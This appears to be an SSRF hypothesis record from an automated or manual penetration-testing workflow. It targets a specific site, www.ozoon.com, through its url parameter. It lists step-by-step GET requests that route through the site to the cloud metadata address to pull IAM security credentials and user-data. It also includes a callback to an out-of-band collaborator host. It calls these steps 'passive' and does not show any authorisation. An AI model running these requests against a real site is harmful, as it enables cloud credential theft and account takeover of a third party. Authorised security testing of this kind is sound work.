[HYP] SSRF via url parameter on PWS/wnacloud marketing edge — cloud metadata exfiltration
class: SSRF
asset: https://www.ozoon.com/?url=
confidence: 70
reasoning: Prior SSRF probe `GET ?url=http://169.254.169.254/latest/meta-data/` returned HTTP 200 — the first concrete response from any SSRF candidate. PWS/wnacloud shared hosting historically processes fetch-type parameters server-side. The 200 status on a metadata IP target (not a normal page resource) is anomalous; a 404 or 200-with-no-content would be normal for a static page. This is the only AUTH-free vector with confirmed live response.
evidence_needed: Response body containing cloud instance metadata (ami-id, instance-id, iam/security-credentials) proves SSRF; even partial metadata (e.g., `instance-id`, `local-ipv4`) confirms server-side fetch.
verify_steps: 1. GET https://www.ozoon.com/?url=http://169.254.169.254/latest/meta-data/ — capture full response body. 2. GET https://www.ozoon.com/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ — capture. 3. GET https://www.ozoon.com/?url=http://169.254.169.254/latest/user-data/ — capture. 4. GET https://www.ozoon.com/?url=http://[collab-id].oast.fun/ — confirm outbound DNS/HTTP callback. All GET-only, ≤1rps, no auth required.
impact: Critical — cloud metadata creds → full cloud account compromise; lateral movement to other tenants on shared edge; crypto wallet/payment system access.
testability: PASSIVE

